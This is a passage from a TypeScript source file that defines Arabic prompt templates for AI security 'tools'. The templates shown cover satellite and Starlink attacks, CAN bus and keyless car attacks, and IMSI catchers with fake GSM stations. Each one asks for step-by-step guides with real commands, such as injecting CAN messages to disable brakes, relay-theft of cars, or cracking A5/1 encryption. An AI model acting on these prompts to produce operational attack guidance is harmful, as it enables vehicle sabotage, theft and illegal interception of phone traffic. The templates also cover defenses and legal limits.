رقمية من ACARS\n7. Starlink Security:\n    - هجوم Lennert Wouters: Fault injection على Starlink dish\n    - UART shell على Starlink terminal\n    - شبكة Starlink: ثغرات التوجيه والـ inter-satellite links\n8. Counter-Measures:\n    - تشفير الاتصالات الفضائية: AES-256، quantum key distribution\n    - Anti-jamming، anti-spoofing في أنظمة GPS العسكرية (M-code)\n    - Space Information Sharing and Analysis Center (Space-ISAC)\nاكتب بلغة عربية احترافية مع أدوات وأوامر فعلية.`,
    defaultInput: "اختراق الأقمار الصناعية وأمن الفضاء السيبراني",
    inputLabel: "الموضوع أو الاستفسار",
    rows: 3,
  },

  "Automotive / CAN Bus": {
    prompt: `أنت خبير أمن سيبراني تعليمي متخصص في أمن السيارات. قدم دليلاً شاملاً للموضوع:\n\n{input}\n\nاشرح:\n1. مقدمة في أمن السيارات (Automotive Cybersecurity):\n   - السيارة الحديثة: 100+ ECU، شبكة CAN، Ethernet، وصلات لاسلكية\n   - حوادث حقيقية: Jeep Cherokee hack (Miller & Valasek 2015)، Tesla remote hacks\n   - معيار ISO/SAE 21434 لأمن السيارات\n2. CAN Bus (Controller Area Network):\n   - كيف يعمل CAN: شبكة multi-master، ID-based priority، 11/29-bit identifiers\n   - CAN frames: ID، DLC، Data (8 bytes)، CRC\n   - لماذا غير آمن: لا authentication، لا encryption، broadcast-based\n   - أدوات: SocketCAN في Linux، canutils (cansend، candump، cangen)\n3. OBD-II والوصول الفيزيائي:\n   - OBD-II port: شاركة كل سيارة 1996+\n   - أجهزة: ELM327، CANalyzer، Kvaser، PCAN-USB\n   - python-can وsavvyCAN للتحليل\n   - Reverse engineering CAN messages: candump → canplayer → تحليل التغييرات\n4. Attacks على CAN Bus:\n   - CAN Injection: إرسال messages مزيفة لفتح الأبواب، تعطيل المكابح\n   - Replay Attacks: تسجيل وإعادة إرسال messages للأبواب\n   - DoS على CAN: إغراق الشبكة لتعطيل ECUs حيوية\n   - ECU flashing: تعديل firmware للـ ECU عبر CAN أو JTAG\n5. Keyless Entry Attacks:\n   - Relay Attacks: تضخيم إشارة المفتاح عبر جهازين (أكثر سرقة سيارات شيوعاً)\n   - RollJam attack (Samy Kamkar): اعتراض وإعادة إرسال كود الفتح\n   - أجهزة: RTL-SDR + HackRF لاعتراض 315/433 MHz\n   - الحماية: Faraday pouch للمفتاح، ultra-wideband (UWB) في iPhone car key\n6. Telematics & Remote Attacks:\n   - 4G/5G telematics units: OTA updates، remote diagnostics\n   - هجوم Jeep: عبر Sprint network → D-Bus → CAN\n   - Wi-Fi وBluetooth في السيارة: attack surface إضافية\n   - Infotainment hacking: Carplay/Android Auto، USB attacks\n7. TPMS (Tire Pressure Monitoring):\n   - Tracking عبر TPMS IDs الثابتة (315/433 MHz)\n   - تزوير قيم الضغط لإطفاء مؤشر الإنذار\n8. أدوات البحث:\n   - ICSim (CAN bus simulator) للتدريب\n   - Caring Caribou: أداة Python لـ CAN security testing\n   - OpenXC platform\n9. الحماية والمعايير:\n   - Hardware Security Module (HSM) في ECUs\n   - Automotive Ethernet + TLS\n   - AUTOSAR SecOC لـ authenticated CAN messages\n   - V2X communications security\nاكتب بلغة عربية احترافية مع الأوامر والأدوات الفعلية.`,
    defaultInput: "اختراق شبكات CAN Bus والسيارات الحديثة",
    inputLabel: "الموضوع أو الاستفسار",
    rows: 3,
  },

  "IMSI Catcher / Fake BTS": {
    prompt: `أنت خبير أمن سيبراني تعليمي. قدم دليلاً شاملاً للموضوع:\n\n{input}\n\nاشرح:\n1. مقدمة في شبكات الهاتف المحمول:\n   - GSM (2G): البروتوكول الأقدم والأضعف أمنياً\n   - UMTS (3G)، LTE (4G)، 5G NR: التطور الأمني\n   - IMSI: International Mobile Subscriber Identity — المعرف الفريد للشريحة\n   - IMEI: International Mobile Equipment Identity — معرف الجهاز\n2. IMSI Catchers (Stingrays):\n   - ما هو IMSI Catcher: جهاز يتنكر كبرج اتصال حقيقي\n   - كيف يعمل: يجذب الهواتف القريبة للاتصال به بدلاً من البرج الحقيقي\n   - أجهزة تجارية: Harris StingRay، Hailstorm، DRT boxes\n   - الاستخدامات: تتبع الموقع، اعتراض المكالمات والرسائل، رفض الخدمة\n3. OpenBTS - محطة GSM مفتوحة المصدر:\n   - OpenBTS: تطبيق مفتوح لـ GSM base station\n   - المتطلبات: USRP B200 أو HackRF، Asterisk أو Osmocom\n   - إعداد OpenBTS لشبكة GSM تجريبية خاصة\n   - أوامر OpenBTS: تسجيل الأجهزة، إدارة المكالمات\n4. Osmocom Stack:\n   - Osmocom: مشروع مفتوح لبروتوكولات الشبكات الخلوية\n   - OsmoNITB: Network in The Box — شبكة GSM كاملة على جهاز واحد\n   - OsmoBSC، OsmoMSC، OsmoHLR مكونات الشبكة\n   - gr-gsm: استخدام SDR للتقاط وفك تشفير حزم GSM\n5. Downgrade Attacks (4G → 2G):\n   - كيف تجبر الهاتف على استخدام GSM الأضعف\n   - LTE-based IMSI catchers: أحدث جيل من الأجهزة\n   - 4G downgrade: إرسال RRC Release messages\n6. Passive GSM Interception:\n   - استقبال قنوات GSM: airprobe، gr-gsm\n   - فك تشفير A5/0 (لا تشفير): مباشرة بعد الالتقاط\n   - A5/1 (التشفير الأضعف): Rainbow Tables، Kraken، A5/1 cracking\n   - A5/3 (KASUMI): أقوى، لكن ثغرات نظرية\n7. Silent SMS (Type 0 SMS):\n   - رسائل SMS صامتة لا تظهر للمستخدم\n   - استخدامها لتحديد الموقع والـ IMSI collection\n   - modem AT commands لإرسالها\n8. الكشف والحماية:\n   - تطبيقات كشف IMSI Catchers: AIMSICD (Android)\n   - مؤشرات الاشتباه: إشارة قوية جداً، encryption downgrade، برج جديد\n   - استخدام VoIP/Signal بدلاً من مكالمات GSM\n   - iPhone Lockdown Mode لتقليل الـ attack surface\n9. الإطار القانوني:\n   - استخدام IMSI catchers حكر على أجهزة الأمن في معظم الدول\n   - الاستخدام غير المصرح محظور دولياً\n   - بحوث أمنية: شبكات معزولة ومشروع 2G خاص\nاكتب بلغة عربية احترافية مع الأدوات والمصطلحات التقنية.`,
    defaultInput: "IMSI Catchers وشبكات GSM المزيفة والتنصت الخلوي",
    inputLabel: "الموضوع أو الاستفسار",
    rows: 3,
  },
};

// ── Component dispatched for any AI add-on tool ─────────────────────────
function AddOnAITool({ name }: { name: string }) {
  const cfg = AI_TOOL_PROMPTS[name];
  if (!cfg) return <div className="text-[12px] text-muted-foreground">Tool not configured.</div>;
  return (
    <AIChatTool
      promptTemplate={cfg.prompt}
      defaultInput={cfg.defaultInput ?? ""}
      inputLabel={cfg.inputLabel ?? "Input"}
      rows={cfg.rows ?? 4}
    />
  );
}

